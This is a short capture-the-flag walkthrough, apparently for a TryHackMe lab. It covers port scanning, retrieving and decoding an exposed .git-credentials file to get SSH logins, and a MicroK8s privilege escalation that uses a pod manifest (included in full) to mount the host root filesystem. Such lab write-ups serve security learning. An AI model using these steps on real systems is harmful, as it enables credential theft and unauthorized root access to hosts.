## Steps:
1. Install Rustscan:
   - https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
2. Scanwith rustscanner:
  ``` $ rustscan IP ```
3. Nmap scan:
``` nmap -sV -sC -Pn -n -A -p (open ports) IP ```
4. Use dirsearch to find credentials (IP:31337/.git-credentials)
5. Download the credentials file and decode with online URL decoder.
6. Then got the ssh username and password.

### Privilege Escalation with kubernetes Microk8s:
```
1. After coonect with ssh
2. Check it command:
  $ microk8s
  $ microk8s kubectl get node -o yaml
3. Create a pod.yaml file and save it:
  $ nano pod.yaml
4. Apply this pod yaml file: 
  $ microk8s kubectl apply -f pod.yaml
5. Do root:
  $ microk8s kubectl exec -it hostmount /bin/bash
```
### Code in below (pod.yaml):
```
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```
### References:
1. https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation
2. https://github.com/psechoPATH/Tryhackme-Writeup/blob/main/Frank_%26_Herby_make_an_app.md
